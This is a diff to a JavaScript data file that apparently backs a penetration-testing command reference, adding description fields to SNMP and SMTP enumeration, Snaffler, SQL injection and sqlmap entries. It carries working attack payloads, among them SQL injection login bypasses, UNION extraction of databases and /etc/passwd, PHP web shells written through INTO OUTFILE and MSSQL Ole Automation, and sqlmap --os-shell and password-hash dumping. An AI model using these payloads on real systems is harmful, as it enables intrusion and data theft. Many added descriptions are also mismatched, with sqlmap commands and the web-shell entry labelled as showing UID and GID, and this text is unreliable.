           "command": "RCPT TO:<username>@<domain>",
           "caption": "RCPT TO as alternative enum method when VRFY/EXPN disabled",
-          "label": "RCPT"
+          "label": "RCPT",
+          "description": "Tests if a recipient address is valid on the SMTP server. Alternative user enumeration method when VRFY and EXPN are disabled."
         }
       ],
       "opsec": "moderate",
@@ -134555,7 +135418,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Target a host list",
-          "command": "Snaffler.exe -s -n <hostlist> -o snaffler.log"
+          "command": "Snaffler.exe -s -n <hostlist> -o snaffler.log",
+          "description": "Runs Snaffler against a specific list of hosts instead of scanning the entire domain. Focused file share auditing that reduces noise and speeds up results."
         }
       ],
       "steps": [
@@ -134847,15 +135711,18 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "onesixtyone - brute community strings",
-          "command": "onesixtyone -c /opt/useful/seclists/Discovery/SNMP/snmp.txt <ip>"
+          "command": "onesixtyone -c /opt/useful/seclists/Discovery/SNMP/snmp.txt <ip>",
+          "description": "Onesixtyone - brute community strings. See the command syntax for exact parameters and flags."
         },
         {
           "label": "braa - OID brute force",
-          "command": "braa public@<ip>:.1.3.6.*"
+          "command": "braa public@<ip>:.1.3.6.*",
+          "description": "Performs mass SNMP queries using braa. Faster than snmpwalk for querying multiple OIDs or multiple hosts simultaneously."
         },
         {
           "label": "nmap - discover SNMP hosts on subnet, greppable output (OSCP Ch6 canonical first step)",
-          "command": "sudo nmap -sU --open -p 161 <cidr> -oG open-snmp.txt\n# Then feed discovered IPs to onesixtyone + snmpwalk\ngrep 'Up' open-snmp.txt | cut -d' ' -f2 > snmp-targets.txt"
+          "command": "sudo nmap -sU --open -p 161 <cidr> -oG open-snmp.txt\n# Then feed discovered IPs to onesixtyone + snmpwalk\ngrep 'Up' open-snmp.txt | cut -d' ' -f2 > snmp-targets.txt",
+          "description": "Performs a host discovery sweep (ping scan) without port scanning. Quickly identifies live hosts on the network for further enumeration."
         },
         {
           "description": "SNMPv1 walk with timeout (for slow/unreliable targets)",
@@ -135037,15 +135904,18 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Walk with 'public'",
-          "command": "snmpwalk -v 2c -c public <ip> 1.3.6.1.2.1.1.5.0"
+          "command": "snmpwalk -v 2c -c public <ip> 1.3.6.1.2.1.1.5.0",
+          "description": "Walks the SNMP tree using a community string. Enumerates device information by querying SNMP OIDs - common community strings like \"public\" and \"private\" are often left unchanged."
         },
         {
           "label": "Walk with 'private'",
-          "command": "snmpwalk -v 2c -c private <ip>"
+          "command": "snmpwalk -v 2c -c private <ip>",
+          "description": "Walks the SNMP tree using a community string. Enumerates device information by querying SNMP OIDs - common community strings like \"public\" and \"private\" are often left unchanged."
         },
         {
           "label": "Brute-force community strings",
-          "command": "onesixtyone -c dict.txt <ip>"
+          "command": "onesixtyone -c dict.txt <ip>",
+          "description": "Brute-force community strings. See the command syntax for exact parameters and flags."
         }
       ],
       "opsec": "moderate",
@@ -135204,19 +136074,23 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Running processes",
-          "command": "snmpwalk -c <community> -v1 <ip> 1.3.6.1.2.1.25.4.2.1.2"
+          "command": "snmpwalk -c <community> -v1 <ip> 1.3.6.1.2.1.25.4.2.1.2",
+          "description": "Enumerates running processes via SNMP. Lists all active processes on the target without needing interactive access."
         },
         {
           "label": "Installed software",
-          "command": "snmpwalk -c <community> -v1 <ip> 1.3.6.1.2.1.25.6.3.1.2"
+          "command": "snmpwalk -c <community> -v1 <ip> 1.3.6.1.2.1.25.6.3.1.2",
+          "description": "Enumerates installed software via SNMP. Walks the host resources MIB to list all installed applications and their versions."
         },
         {
           "label": "Open TCP ports (listening)",
-          "command": "snmpwalk -c <community> -v1 <ip> 1.3.6.1.2.1.6.13.1.3"
+          "command": "snmpwalk -c <community> -v1 <ip> 1.3.6.1.2.1.6.13.1.3",
+          "description": "Open TCP ports (listening). See the command syntax for exact parameters and flags."
         },
         {
           "label": "Full walk first (then target specific OIDs)",
-          "command": "snmpwalk -c <community> -v1 -t 10 <ip>"
+          "command": "snmpwalk -c <community> -v1 -t 10 <ip>",
+          "description": "Full walk first (then target specific OIDs). See the command syntax for exact parameters and flags."
         }
       ],
       "examples": [
@@ -135444,24 +136318,24 @@ const COMMAND_DATA = {
           "label": "braa (fast OID)"
         },
         {
-          "description": "Windows users OID",
           "command": "snmpwalk -c <community> -v1 <ip> 1.3.6.1.4.1.77.1.2.25",
-          "label": "Windows users"
+          "label": "Windows users",
+          "description": "Walks the SNMP tree using a community string. Enumerates device information by querying SNMP OIDs - common community strings like \"public\" and \"private\" are often left unchanged."
         },
         {
-          "description": "Running processes OID",
           "command": "snmpwalk -c <community> -v1 <ip> 1.3.6.1.2.1.25.4.2.1.2",
-          "label": "Running processes"
+          "label": "Running processes",
+          "description": "Enumerates running processes via SNMP. Lists all active processes on the target without needing interactive access."
         },
         {
-          "description": "Installed software OID",
           "command": "snmpwalk -c <community> -v1 <ip> 1.3.6.1.2.1.25.6.3.1.2",
-          "label": "Installed software"
+          "label": "Installed software",
+          "description": "Enumerates installed software via SNMP. Walks the host resources MIB to list all installed applications and their versions."
         },
         {
-          "description": "Open TCP ports OID",
           "command": "snmpwalk -c <community> -v1 <ip> 1.3.6.1.2.1.6.13.1.3",
-          "label": "Open TCP ports"
+          "label": "Open TCP ports",
+          "description": "Enumerates active TCP connections via SNMP. Shows listening ports and established connections - network reconnaissance without port scanning."
         }
       ],
       "examples": [
@@ -137094,11 +137968,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "MSSQL",
-          "command": "SELECT name FROM master.dbo.sysdatabases\nGO\nUSE <db>\nGO\nSELECT table_name FROM <db>.INFORMATION_SCHEMA.TABLES\nGO"
+          "command": "SELECT name FROM master.dbo.sysdatabases\nGO\nUSE <db>\nGO\nSELECT table_name FROM <db>.INFORMATION_SCHEMA.TABLES\nGO",
+          "description": "Executes a SQL query for data extraction or enumeration. Retrieves specific data from the target database."
         },
         {
           "label": "MySQL",
-          "command": "SHOW DATABASES;\nUSE <db>;\nSHOW TABLES;\nSELECT * FROM <table>;"
+          "command": "SHOW DATABASES;\nUSE <db>;\nSHOW TABLES;\nSELECT * FROM <table>;",
+          "description": "Enumerates MySQL database structure. Lists databases, tables, or columns to map the data layout and find tables containing credentials or sensitive information."
         }
       ],
       "opsec": "loud",
@@ -137277,11 +138153,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "MSSQL",
-          "command": "SELECT * FROM OPENROWSET(BULK N'<path>', SINGLE_CLOB) AS Contents\nGO"
+          "command": "SELECT * FROM OPENROWSET(BULK N'<path>', SINGLE_CLOB) AS Contents\nGO",
+          "description": "Executes a SQL query for data extraction or enumeration. Retrieves specific data from the target database."
         },
         {
           "label": "MySQL",
-          "command": "select LOAD_FILE(\"<path>\");"
+          "command": "select LOAD_FILE(\"<path>\");",
+          "description": "Reads a local file through a SQL injection using the LOAD_FILE function. Extracts system files like /etc/passwd or application config files via the database."
         }
       ],
       "opsec": "loud",
@@ -137467,7 +138345,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "MSSQL (Ole Automation)",
-          "command": "sp_configure 'show advanced options', 1\nGO\nRECONFIGURE\nGO\nsp_configure 'Ole Automation Procedures', 1\nGO\nRECONFIGURE\nGO\nDECLARE @OLE INT\nDECLARE @FileID INT\nEXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT\nEXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\\inetpub\\wwwroot\\webshell.php', 8, 1\nEXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET[\"c\"]);?>'\nEXECUTE sp_OADestroy @FileID\nEXECUTE sp_OADestroy @OLE\nGO"
+          "command": "sp_configure 'show advanced options', 1\nGO\nRECONFIGURE\nGO\nsp_configure 'Ole Automation Procedures', 1\nGO\nRECONFIGURE\nGO\nDECLARE @OLE INT\nDECLARE @FileID INT\nEXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT\nEXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\\inetpub\\wwwroot\\webshell.php', 8, 1\nEXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET[\"c\"]);?>'\nEXECUTE sp_OADestroy @FileID\nEXECUTE sp_OADestroy @OLE\nGO",
+          "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
         }
       ],
       "opsec": "loud",
@@ -137781,15 +138660,18 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Comment out rest",
-          "command": "admin'-- -"
+          "command": "admin'-- -",
+          "description": "SQL injection payload that manipulates the database query. Tests for SQL injection vulnerabilities by injecting SQL syntax into user input fields."
         },
         {
           "label": "OR true, close paren",
-          "command": "' OR 1=1-- -   |   ') OR ('1'='1"
+          "command": "' OR 1=1-- -   |   ') OR ('1'='1",
+          "description": "OR true, close paren. See the command syntax for exact usage and parameters."
         },
         {
           "label": "Union to a known password hash",
-          "command": "' UNION SELECT 'admin','<md5_of_known_pw>'-- -"
+          "command": "' UNION SELECT 'admin','<md5_of_known_pw>'-- -",
+          "description": "Union to a known password hash. See the command syntax for exact parameters and flags."
         }
       ],
       "explain": "Bypasses a login by making the WHERE clause always true.:\n  ' OR '1'='1\nThree distinct bypass families: (1) OR injection - makes WHERE always true, logs in as first DB user (often admin)."
@@ -138179,11 +139061,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "MSSQL",
-          "command": "cn' UNION select 1,@@version,3,4-- -   # look for 'Microsoft SQL Server'"
+          "command": "cn' UNION select 1,@@version,3,4-- -   # look for 'Microsoft SQL Server'",
+          "description": "SQL injection payload that manipulates the database query. Tests for SQL injection vulnerabilities by injecting SQL syntax into user input fields."
         },
         {
           "label": "Postgres",
-          "command": "cn' UNION select 1,version(),3,4-- -"
+          "command": "cn' UNION select 1,version(),3,4-- -",
+          "description": "SQL injection payload that manipulates the database query. Tests for SQL injection vulnerabilities by injecting SQL syntax into user input fields."
         }
       ],
       "explain": "Identifies the database engine and version so you use the right syntax.:\n  cn' UNION select 1,@@version,3,4-- -\nIdentify the DBMS (MySQL/MSSQL/PostgreSQL/Oracle) before crafting payloads - version()/@@version, comment syntax, and string concat all differ."
@@ -138405,15 +139289,18 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Double quote / numeric",
-          "command": "1\"  |  1) OR (1=1"
+          "command": "1\"  |  1) OR (1=1",
+          "description": "Double quote / numeric. See the command syntax for exact usage and parameters."
         },
         {
           "label": "Time-based blind probe",
-          "command": "1' AND SLEEP(5)-- -"
+          "command": "1' AND SLEEP(5)-- -",
+          "description": "Time-based blind SQL injection payload. Detects SQL injection by measuring response time differences when a time-delay function is injected."
         },
         {
           "label": "Boolean probe",
-          "command": "1' AND 1=1-- -   vs   1' AND 1=2-- -"
+          "command": "1' AND 1=1-- -   vs   1' AND 1=2-- -",
+          "description": "Boolean-based blind SQL injection test. Compares the response of a true condition (1=1) vs. a false condition (1=2) - a difference confirms the query is injectable even when errors are suppressed."
         }
       ],
       "steps": [
@@ -138640,11 +139527,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Current user + DB",
-          "command": "cn' UNION SELECT 1, concat(user(),' | ',database()), 3, 4-- -"
+          "command": "cn' UNION SELECT 1, concat(user(),' | ',database()), 3, 4-- -",
+          "description": "SQL injection payload that manipulates the database query. Tests for SQL injection vulnerabilities by injecting SQL syntax into user input fields."
         },
         {
           "label": "Check FILE privilege (for read/write)",
-          "command": "cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -"
+          "command": "cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -",
+          "description": "Check FILE privilege (for read/write). See the command syntax for exact parameters and flags."
         }
       ],
       "steps": [
@@ -138858,11 +139747,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "UNION NULLs to find column count",
-          "command": "' UNION SELECT NULL,NULL,NULL-- -"
+          "command": "' UNION SELECT NULL,NULL,NULL-- -",
+          "description": "UNION NULLs to find column count. See the command syntax for exact parameters and flags."
         },
         {
           "label": "Find a string-reflecting column",
-          "command": "' UNION SELECT 1,'INJ',3,4-- -"
+          "command": "' UNION SELECT 1,'INJ',3,4-- -",
+          "description": "Find a string-reflecting column. See the command syntax for exact parameters and flags."
         }
       ],
       "steps": [
@@ -139302,11 +140193,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "MySQL LOAD_FILE",
-          "command": "cn' UNION SELECT 1, LOAD_FILE('/etc/passwd'), 3, 4-- -"
+          "command": "cn' UNION SELECT 1, LOAD_FILE('/etc/passwd'), 3, 4-- -",
+          "description": "SQL injection payload that manipulates the database query. Tests for SQL injection vulnerabilities by injecting SQL syntax into user input fields."
         },
         {
           "label": "MSSQL OPENROWSET",
-          "command": "' UNION SELECT 1,(SELECT x FROM OPENROWSET(BULK '<path>',SINGLE_CLOB) R(x)),3,4-- -"
+          "command": "' UNION SELECT 1,(SELECT x FROM OPENROWSET(BULK '<path>',SINGLE_CLOB) R(x)),3,4-- -",
+          "description": "SQL injection payload that manipulates the database query. Tests for SQL injection vulnerabilities by injecting SQL syntax into user input fields."
         }
       ],
       "explain": "Reads server-side files through the injection using MySQL's LOAD_FILE(), placed in a visible UNION column.:\n  cn' UNION SELECT 1, LOAD_FILE('<path>'), 3, 4-- -\nNeeds FILE privilege."
@@ -139402,19 +140295,23 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Current Database",
-          "command": "cn' UNION select 1,database(),2,3-- -"
+          "command": "cn' UNION select 1,database(),2,3-- -",
+          "description": "SQL injection payload that manipulates the database query. Tests for SQL injection vulnerabilities by injecting SQL syntax into user input fields."
         },
         {
           "label": "List Tables",
-          "command": "cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='<db>'-- -"
+          "command": "cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='<db>'-- -",
+          "description": "SQL injection payload that manipulates the database query. Tests for SQL injection vulnerabilities by injecting SQL syntax into user input fields."
         },
         {
           "label": "List Columns",
-          "command": "cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='<table>'-- -"
+          "command": "cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='<table>'-- -",
+          "description": "SQL injection payload that manipulates the database query. Tests for SQL injection vulnerabilities by injecting SQL syntax into user input fields."
         },
         {
           "label": "Dump Table",
-          "command": "cn' UNION select 1,<col1>,<col2>,4 from <db>.<table>-- -"
+          "command": "cn' UNION select 1,<col1>,<col2>,4 from <db>.<table>-- -",
+          "description": "SQL injection payload that manipulates the database query. Tests for SQL injection vulnerabilities by injecting SQL syntax into user input fields."
         }
       ],
       "opsec": "loud",
@@ -139744,7 +140641,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Base64-encoded payload (WAF bypass for content-inspection filters)",
-          "command": "cn' union select 1,FROM_BASE64('<base64_php_webshell>'),3,4 into outfile '/var/www/html/shell.php'-- -"
+          "command": "cn' union select 1,FROM_BASE64('<base64_php_webshell>'),3,4 into outfile '/var/www/html/shell.php'-- -",
+          "description": "Base64-encoded payload (WAF bypass for content-inspection filters). See the command syntax for exact parameters and flags."
         }
       ],
       "explain": "Writes attacker-controlled content to disk via SELECT ...:\n  cn' union select 1,'<?php system($_REQUEST[0]); ?>',3,4 into outfile '/var/www/html/shell.php'-- -\nThen run commands via http://<host>/shell.php?0=id."
@@ -139925,7 +140823,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Fetch token from a separate URL",
-          "command": "sqlmap -u \"http://<target>/\" --data=\"id=1&token=x\" --csrf-token=\"token\" --csrf-url=\"http://<target>/form\" --batch"
+          "command": "sqlmap -u \"http://<target>/\" --data=\"id=1&token=x\" --csrf-token=\"token\" --csrf-url=\"http://<target>/form\" --batch",
+          "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
         }
       ],
       "explain": "Handles forms protected by a per-request anti-CSRF token.:\n  -u http://<target>/  username / user to authenticate as\n  <target>             target host\nThe value you pass in --data can be stale; SQLMap refreshes it."
@@ -140287,11 +141186,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Enumerate DB users, privs, roles",
-          "command": "sqlmap -u \"http://<target>/?id=1\" --users --privileges --roles --batch"
+          "command": "sqlmap -u \"http://<target>/?id=1\" --users --privileges --roles --batch",
+          "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
         },
         {
           "label": "Check DBA only",
-          "command": "sqlmap -u \"http://<target>/?id=1\" --is-dba --batch"
+          "command": "sqlmap -u \"http://<target>/?id=1\" --is-dba --batch",
+          "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
         }
       ],
       "explain": "Pulls high-level database facts in one pass: version banner, the DB user the app connects as, the current database name, and whether that user has DBA privileges.:\n  -u http://<target>/?id=1 username / user to authenticate as\n  <target>                 target host\n--is-dba returning True means you can likely read/write files and try --os-shell."
@@ -140666,11 +141567,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Log full HTTP traffic",
-          "command": "sqlmap -u \"http://<target>/vuln.php?id=1\" -t /tmp/traffic.txt --batch"
+          "command": "sqlmap -u \"http://<target>/vuln.php?id=1\" -t /tmp/traffic.txt --batch",
+          "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
         },
         {
           "label": "Show injected payloads",
-          "command": "sqlmap -u \"http://<target>/vuln.php?id=1\" -v 3 --batch"
+          "command": "sqlmap -u \"http://<target>/vuln.php?id=1\" -v 3 --batch",
+          "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
         }
       ],
       "explain": "Troubleshoots a scan that is not confirming injection.:\n  -u http://<target>/vuln.php?id=1username / user to authenticate as\n  -v 6                     verbose output\n  <target>                 target host\nStart at -v 3 for payloads, escalate to -v 6 for raw traffic."
@@ -140854,7 +141757,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Only the current DB user's hash",
-          "command": "sqlmap -u \"http://<target>/?id=1\" --passwords -U CURRENT_USER --batch"
+          "command": "sqlmap -u \"http://<target>/?id=1\" --passwords -U CURRENT_USER --batch",
+          "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
         }
       ],
       "explain": "Enumerates the database management system's own user accounts and their password hashes (e.g. MySQL's mysql.user).:\n  -u http://<target>/?id=1 username / user to authenticate as\n  <target>                 target host\nRequires sufficient privileges to read the system user table (usually DBA)."
@@ -141034,19 +141938,23 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Dump a specific table",
-          "command": "sqlmap -u \"http://<target>/?id=1\" --dump -D <db> -T users --batch"
+          "command": "sqlmap -u \"http://<target>/?id=1\" --dump -D <db> -T users --batch",
+          "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
         },
         {
           "label": "Dump specific columns",
-          "command": "sqlmap -u \"http://<target>/?id=1\" --dump -D <db> -T users -C name,surname --batch"
+          "command": "sqlmap -u \"http://<target>/?id=1\" --dump -D <db> -T users -C name,surname --batch",
+          "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
         },
         {
           "label": "Filter rows (WHERE)",
-          "command": "sqlmap -u \"http://<target>/?id=1\" --dump -D <db> -T users --where=\"name LIKE 'f%'\" --batch"
+          "command": "sqlmap -u \"http://<target>/?id=1\" --dump -D <db> -T users --where=\"name LIKE 'f%'\" --batch",
+          "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
         },
         {
           "label": "Row range",
-          "command": "sqlmap -u \"http://<target>/?id=1\" --dump -D <db> -T users --start=2 --stop=3 --batch"
+          "command": "sqlmap -u \"http://<target>/?id=1\" --dump -D <db> -T users --start=2 --stop=3 --batch",
+          "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
         }
       ],
       "explain": "Dumps every table in every database, skipping the built-in system schemas with --exclude-sysdbs.:\n  -u http://<target>/?id=1 username / user to authenticate as\n  <target>                 target host\n--all is the maximum automatic enumeration."
@@ -141226,11 +142134,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Skip system DBs",
-          "command": "sqlmap -u \"http://<target>/?id=1\" --schema --exclude-sysdbs --batch"
+          "command": "sqlmap -u \"http://<target>/?id=1\" --schema --exclude-sysdbs --batch",
+          "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
         },
         {
           "label": "Count rows per table",
-          "command": "sqlmap -u \"http://<target>/?id=1\" --count -D <db> --batch"
+          "command": "sqlmap -u \"http://<target>/?id=1\" --count -D <db> --batch",
+          "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
         }
       ],
       "explain": "Retrieves the entire database structure - every database, table, and column name (no data).:\n  -u http://<target>/?id=1 username / user to authenticate as\n  <target>                 target host\nPair with --search to hunt specific names across the whole schema."
@@ -141267,7 +142177,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "--no-cast (fix empty/corrupted results)",
-          "command": "sqlmap -u \"http://<target>/?id=1\" --dump -T users -D testdb --no-cast --batch"
+          "command": "sqlmap -u \"http://<target>/?id=1\" --dump -T users -D testdb --no-cast --batch",
+          "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
         }
       ],
       "examples": [
@@ -141606,11 +142517,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "List columns of a table",
-          "command": "sqlmap -u \"http://<target>/?id=1\" --columns -T users -D <db> --batch"
+          "command": "sqlmap -u \"http://<target>/?id=1\" --columns -T users -D <db> --batch",
+          "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
         },
         {
           "label": "Dump the table",
-          "command": "sqlmap -u \"http://<target>/?id=1\" --dump -T users -D <db> --batch"
+          "command": "sqlmap -u \"http://<target>/?id=1\" --dump -T users -D <db> --batch",
+          "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
         }
       ],
       "explain": "Lists all tables inside the database named with -D.:\n  -u http://<target>/?id=1 username / user to authenticate as\n  <target>                 target host\nThen dump a table with --dump -T <table> -D <db>."
@@ -141965,7 +142878,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Verbose payload trace",
-          "command": "sqlmap -u \"http://<target>/?id=1\" --level=5 --risk=3 -v 3 --batch"
+          "command": "sqlmap -u \"http://<target>/?id=1\" --level=5 --risk=3 -v 3 --batch",
+          "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
         }
       ],
       "explain": "Widens how aggressively SQLMap tests.:\n  -u http://<target>/?id=1 username / user to authenticate as\n  <target>                 target host\nLevel 5 + risk 3 is the maximum coverage but slowest."
@@ -142144,11 +143058,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Session cookie",
-          "command": "sqlmap -u \"http://<target>/\" --cookie='PHPSESSID=<sess>' --batch"
+          "command": "sqlmap -u \"http://<target>/\" --cookie='PHPSESSID=<sess>' --batch",
+          "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
         },
         {
           "label": "Cookie via header",
-          "command": "sqlmap -u \"http://<target>/\" -H='Cookie:PHPSESSID=<sess>' --batch"
+          "command": "sqlmap -u \"http://<target>/\" -H='Cookie:PHPSESSID=<sess>' --batch",
+          "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
         }
       ],
       "explain": "Tests a cookie value for SQL injection.:\n  -u http://<target>/  username / user to authenticate as\n  <target>             target host\nEquivalent with a raw header: -H='Cookie:PHPSESSID=...'."
@@ -142500,7 +143416,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Current database only",
-          "command": "sqlmap -u \"http://<target>/?id=1\" --current-db --batch"
+          "command": "sqlmap -u \"http://<target>/?id=1\" --current-db --batch",
+          "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
         }
       ],
       "explain": "Enumerates all database (schema) names the current user can see.:\n  -u http://<target>/?id=1 username / user to authenticate as\n  <target>                 target host\nFollow with --tables -D <dbname>."
@@ -143078,7 +143995,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Route through Tor",
-          "command": "sqlmap -u \"http://<target>/?id=1\" --tor --tor-type=SOCKS5 --check-tor --batch"
+          "command": "sqlmap -u \"http://<target>/?id=1\" --tor --tor-type=SOCKS5 --check-tor --batch",
+          "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
         }
       ],
       "explain": "Routes all SQLMap traffic through a proxy or the Tor network.:\n  -u http://<target>/?id=1 username / user to authenticate as\n  <target>                 target host\nRoute through Burp with --proxy=http://127.0.0.1:8080 to inspect requests."
@@ -143437,7 +144355,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Fallback when retrieval fails",
-          "command": "sqlmap -u \"http://<target>/?id=1\" --file-read \"/etc/passwd\" --hex --no-cast"
+          "command": "sqlmap -u \"http://<target>/?id=1\" --file-read \"/etc/passwd\" --hex --no-cast",
+          "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
         }
       ],
       "explain": "Reads a file off the database server's filesystem through the injection.:\n  -u http://<target>/?id=1 username / user to authenticate as\n  <target>                 target host\nConfirm --is-dba first."
@@ -143799,11 +144718,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Time-based blind only",
-          "command": "sqlmap -u \"http://<target>/?id=1\" --technique=T --batch"
+          "command": "sqlmap -u \"http://<target>/?id=1\" --technique=T --batch",
+          "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
         },
         {
           "label": "Error-based for OS shell",
-          "command": "sqlmap -u \"http://<target>/?id=1\" --os-shell --technique=E"
+          "command": "sqlmap -u \"http://<target>/?id=1\" --os-shell --technique=E",
+          "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
         }
       ],
       "explain": "Limits SQLMap to specific injection techniques.:\n  -u http://<target>/?id=1 username / user to authenticate as\n  <target>                 target host\nCommon: --technique=BEU skips slow time-based tests."
@@ -144171,7 +145092,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Search tables by name",
-          "command": "sqlmap -u \"http://<target>/?id=1\" --search -T user --batch"
+          "command": "sqlmap -u \"http://<target>/?id=1\" --search -T user --batch",
+          "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
         }
       ],
       "explain": "Searches the whole database for tables or columns matching a keyword.:\n  -u http://<target>/?id=1 username / user to authenticate as\n  <target>                 target host\nOnce found, dump just that table/column with --dump -T <table> -C <column>."
@@ -144387,7 +145309,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "JSON POST body (APIs / modern apps)",
-          "command": "sqlmap -u \"http://<target>/api/action\" -X POST -H \"Content-Type: application/json\" --data-raw '{\"id\":1}' --batch"
+          "command": "sqlmap -u \"http://<target>/api/action\" -X POST -H \"Content-Type: application/json\" --data-raw '{\"id\":1}' --batch",
+          "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
         }
       ],
       "examples": [
@@ -144717,7 +145640,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Force UNION source table",
-          "command": "sqlmap -u \"http://<target>/?id=1\" --union-cols=5 --union-from=users --dbms=MySQL --batch"
+          "command": "sqlmap -u \"http://<target>/?id=1\" --union-cols=5 --union-from=users --dbms=MySQL --batch",
+          "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
         }
       ],
       "explain": "Manually configures UNION-based extraction.:\n  -u http://<target>/?id=1 username / user to authenticate as\n  <target>                 target host\nIf NULL filler fails, --union-char=1 or 'a' often works."
@@ -144904,11 +145828,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Smartphone UA spoof (bypass mobile-vs-desktop filters)",
-          "command": "sqlmap -u \"http://<target>/?id=1\" --mobile --batch"
+          "command": "sqlmap -u \"http://<target>/?id=1\" --mobile --batch",
+          "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
         },
         {
           "label": "Copy browser headers to bypass header-based auth / WAF checks",
-          "command": "sqlmap -u \"http://<target>/?id=1\" -H 'Accept: text/html,*/*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Connection: keep-alive' -H 'DNT: 1' --random-agent --batch"
